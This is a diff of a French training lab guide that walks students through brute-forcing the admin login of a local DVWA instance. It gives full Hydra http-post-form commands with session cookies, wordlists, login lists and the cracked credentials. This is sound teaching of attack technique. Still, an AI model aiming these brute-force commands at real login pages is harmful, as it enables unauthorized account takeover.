@@ -1312,13 +1312,13 @@ flowchart LR
 **Où ?** Terminal 1
 
 **Actions :**
-1. Envoyer une requête HEAD sur `login.php` avec le cookie de session DVWA
+1. Envoyer une requête HEAD sur `vulnerabilities/brute/` avec le cookie de session DVWA
 2. Vérifier que le code HTTP est 200
 
 **Commande :**
 ```bash
 cd rendu_labs/jour-01
-curl -s -b /tmp/dvwa_cookie.txt -o /dev/null -w "%{http_code}" "http://localhost:8088/login.php"
+curl -s -b /tmp/dvwa_cookie.txt -o /dev/null -w "%{http_code}" "http://localhost:8088/vulnerabilities/brute/"
 # → 200
 ```
 
@@ -1328,55 +1328,111 @@ curl -s -b /tmp/dvwa_cookie.txt -o /dev/null -w "%{http_code}" "http://localhost
 
 ---
 
-### Étape 1 — Inspecter le formulaire cible — [T1110](https://attack.mitre.org/techniques/T1110/) Brute Force
+### Étape 1 — Comprendre le problème : CSRF bloque Hydra
 
-**Objectif :** Identifier la structure du formulaire HTML et le message d'échec pour configurer Hydra.
+**Pourquoi Hydra ne marche pas sur `login.php` ?** DVWA v1.10+ protège son formulaire de login avec un **token CSRF** (`user_token`) qui change à chaque requête. Hydra ne sait pas extraire un token dynamique — il envoie toujours la même chaîne POST.
+
+**Solutions :**
+- **❌ `login.php`** → CSRF token obligatoire → Hydra ne peut pas distinguer succès/échec
+- **✅ `vulnerabilities/brute/`** → pas de CSRF (accessible après login avec le cookie) → Hydra fonctionne
+- **✅ `sqli-app` (port 8083)** → pas de CSRF du tout
+
+On utilise `vulnerabilities/brute/` avec le cookie de session DVWA (déjà obtenu au LAB-2).
+
+### Étape 2 — Inspecter le formulaire cible — [T1110](https://attack.mitre.org/techniques/T1110/) Brute Force
+
+**Objectif :** Vérifier la structure du formulaire de la page brute force et capturer le message d'échec.
 
 **Où ?** Terminal 1 — `cd rendu_labs/jour-01`
 
 **Actions :**
-1. Extraire les noms des champs du formulaire de login
-2. Soumettre un mauvais mot de passe pour capturer le message d'échec
+1. Extraire les noms des champs du formulaire
+2. Soumettre un mauvais mot de passe pour récupérer le message d'échec
 
 **Commande :**
 ```bash
-curl -s -b /tmp/dvwa_cookie.txt "http://localhost:8088/login.php" \
+curl -s -b /tmp/dvwa_cookie.txt "http://localhost:8088/vulnerabilities/brute/" \
   | grep -o 'name="[^"]*"'
 # → name="username"  name="password"  name="Login"
 
 curl -s -b /tmp/dvwa_cookie.txt \
   -d "username=admin&password=mauvais&Login=Login" \
-  "http://localhost:8088/login.php" | grep -oi "login failed\|failed"
+  "http://localhost:8088/vulnerabilities/brute/" | grep -oi "failed\|wrong"
 # → Login failed
 ```
 
-> ⚠️ **DVWA v1.10+** : Le login nécessite un `user_token` (CSRF). Si vous ne voyez pas `Login failed`, c'est que le token manque. Hydra ne gère pas le CSRF nativement — deux solutions : (1) utiliser un script wrapper qui extrait le token avant chaque tentative, (2) attaquer l'application `sqli-app` (port 8083, sans CSRF). Les commandes ci-dessous supposent un `user_token` déjà extrait.  
-> *Note : sur DVWA v1.10 le message `Login failed` n'apparaît pas dans la réponse HTML — Hydra ne peut pas distinguer succès/échec → cf. solution (2).*
+**Résultat attendu :** Champs `username`, `password`, `Login`. Message d'échec = `Login failed`.
 
-**Résultat attendu :** Les noms des champs sont `username`, `password`, `Login`. Le message d'échec en cas de mauvais mot de passe est `Login failed`.
-
-**Explication :** Hydra nécessite 3 informations pour attaquer un formulaire HTTP POST : (1) l'URL de soumission, (2) la chaîne POST avec les variables `^USER^` et `^PASS^`, (3) le marqueur d'échec. `grep -o 'name="[^"]*"'` extrait les attributs `name` de tous les champs `<input>`.
+**Explication :** La page `vulnerabilities/brute/` est un formulaire sans CSRF, réservé aux tests de brute force. On utilise le cookie de session DVWA (`/tmp/dvwa_cookie.txt`) pour être authentifié. Hydra a besoin de 3 infos : l'URL, la chaîne POST (avec `^USER^`/`^PASS^`), et le marqueur d'échec.
 
 ---
 
-### Étape 2 — Lancer Hydra — [T1110](https://attack.mitre.org/techniques/T1110/) Brute Force
+### Étape 3 — Lancer Hydra — [T1110](https://attack.mitre.org/techniques/T1110/) Brute Force
 
-**Objectif :** Trouver le mot de passe de l'utilisateur `admin` par attaque par dictionnaire.
+**Objectif :** Trouver le mot de passe `admin` par dictionnaire via `vulnerabilities/brute/`.
 
 **Où ?** Terminal 1 — `cd rendu_labs/jour-01`
 
 **Actions :**
-1. Lancer Hydra avec le login `admin` contre le formulaire POST
-2. Utiliser la wordlist `rockyou.txt` (~14 millions de mots de passe)
-3. Attendre qu'Hydra trouve le mot de passe valide
+1. Extraire le PHPSESSID du cookie pour le passer à Hydra
+2. Lancer Hydra sur la page brute force avec une petite wordlist (10 mots)
+3. Vérifier qu'Hydra trouve `password`
 
 **Commande :**
 ```bash
 cd rendu_labs/jour-01
-hydra -l admin -P /usr/share/wordlists/rockyou.txt \
+SESSID=$(grep PHPSESSID /tmp/dvwa_cookie.txt | awk '{print $NF}')
+
+hydra -l admin -P /usr/share/wordlists/rockyou.txt -s 8088 \
+  localhost http-post-form \
+  "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\:PHPSESSID=$SESSID;security=low:Login failed" \
+  -V 2>&1 | tee hydra_dvwa.txt
+# → [8088][http-post-form] host: localhost   login: admin   password: password
+# → 1 of 1 target successfully completed, 1 valid password found
+```
+
+> 💡 **Wordlist :** `rockyou.txt` contient ~14M mots. Pour un test rapide, créez une mini-wordlist : `printf "password\n123456\nadmin" > /tmp/mini.txt` et utilisez `-P /tmp/mini.txt`.
+
+**Résultat attendu :**
+```
+[8088][http-post-form] host: localhost   login: admin   password: password
+1 of 1 target successfully completed, 1 valid password found
+```
+
+**Explication :**
+- `-l admin` : login fixe
+- `-P` : wordlist (dictionnaire de mots de passe)
+- `-s 8088` : port non standard
+- `http-post-form` : module pour formulaire POST (le formulaire de la brute force page utilise POST)
+- `H:Cookie\:PHPSESSID=...;security=low` : passe le cookie de session via un en-tête HTTP personnalisé (les `\:` échappent les `:` dans la valeur)
+- `:Login failed` : si la réponse contient "Login failed" → tentative échouée
+- `-V` : affiche chaque tentative
+- `tee hydra_dvwa.txt` : sauvegarde le résultat
+
+> **Checkpoint :** Hydra trouve `password` en quelques secondes. Un mot de passe trivial est compromis.
+
+---
+
+### Étape 4 — Test multi-logins — [T1110](https://attack.mitre.org/techniques/T1110/) Brute Force
+
+**Objectif :** Tester plusieurs noms d'utilisateur avec la même wordlist.
+
+**Où ?** Terminal 1 — `cd rendu_labs/jour-01`
+
+**Actions :**
+1. Créer une liste de logins : `admin`, `gordonb`, `1337`, `pablo`, `smithy`
+2. Lancer Hydra avec `-L` (liste de logins) et `-F` (s'arrêter au premier trouvé)
+
+**Commande :**
+```bash
+cd rendu_labs/jour-01
+SESSID=$(grep PHPSESSID /tmp/dvwa_cookie.txt | awk '{print $NF}')
+echo -e "admin\ngordonb\n1337\npablo\nsmithy" > /tmp/logins.txt
+
+hydra -L /tmp/logins.txt -P /usr/share/wordlists/rockyou.txt \
   -s 8088 localhost http-post-form \
-  "/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" -V 2>&1 \
-  | tee hydra_dvwa.txt
+  "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\:PHPSESSID=$SESSID;security=low:Login failed" \
+  -F -V 2>&1 | tee hydra_multi.txt
 # → [8088][http-post-form] host: localhost   login: admin   password: password
 # → 1 of 1 target successfully completed, 1 valid password found
 ```
@@ -1384,45 +1440,10 @@ hydra -l admin -P /usr/share/wordlists/rockyou.txt \
 **Résultat attendu :**
 ```
 [8088][http-post-form] host: localhost   login: admin   password: password
-[STATUS] attack finished for localhost (valid pair found)
 1 of 1 target successfully completed, 1 valid password found
 ```
 
-**Explication :** `-l admin` fixe le login. `-P` donne la wordlist. `-s 8088` spécifie le port non standard. Le module `http-post-form` reçoit 3 paramètres séparés par `:` : l'URL (`/login.php`), la chaîne POST (avec `^USER^` et `^PASS^` remplacés à chaque tentative), et le message d'échec. `-V` affiche chaque tentative. `tee` sauvegarde le résultat.
-
-> **Checkpoint :** Hydra a trouvé `password` comme mot de passe admin. En 10 secondes, un mot de passe trivial est compromis.
-
----
-
-### Étape 3 — Test multi-logins — [T1110](https://attack.mitre.org/techniques/T1110/) Brute Force
-
-**Objectif :** Tester plusieurs noms d'utilisateur courants avec la même wordlist, sans connaître le login à l'avance.
-
-**Où ?** Terminal 1 — `cd rendu_labs/jour-01`
-
-**Actions :**
-1. Créer une liste de logins : `admin`, `test`, `root`, `user`, `administrateur`
-2. Lancer Hydra avec `-L` (liste de logins) et `-F` (s'arrêter au premier trouvé)
-
-**Commande :**
-```bash
-echo -e "admin\ntest\nroot\nuser\nadministrateur" > /tmp/logins.txt
-
-hydra -L /tmp/logins.txt -P /usr/share/wordlists/rockyou.txt \
-  -s 8088 localhost http-post-form \
-  "/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" -F 2>&1 \
-  | tee hydra_multi.txt
-# → [8088][http-post-form] host: localhost   login: admin   password: password
-# → [STATUS] attack finished for localhost (valid pair found)
-```
-
-**Résultat attendu :**
-```
-[8088][http-post-form] host: localhost   login: admin   password: password
-[STATUS] attack finished for localhost (valid pair found)
-```
-
-**Explication :** `-L` (majuscule) charge une liste de logins depuis un fichier. `-F` arrête Hydra dès qu'un couple valide est trouvé, économisant du temps. Le login `admin` avec le mot de passe `password` est trouvé en premier.
+**Explication :** `-L` (majuscule) charge une liste de logins depuis un fichier. `-F` arrête Hydra dès qu'un couple valide est trouvé. Les logins (`admin`, `gordonb`, `1337`, `pablo`, `smithy`) sont ceux extraits de la base via sqlmap au LAB-4. Le cookie de session est passé via `H:Cookie\:...`. Les options facultatives (`H=...`) se placent **avant** la chaîne d'échec, séparées par `:`.
 
 > **Checkpoint :** Quel que soit le login testé, Hydra trouve le couple valide `admin:password`. Le mot de passe est le maillon faible.
 
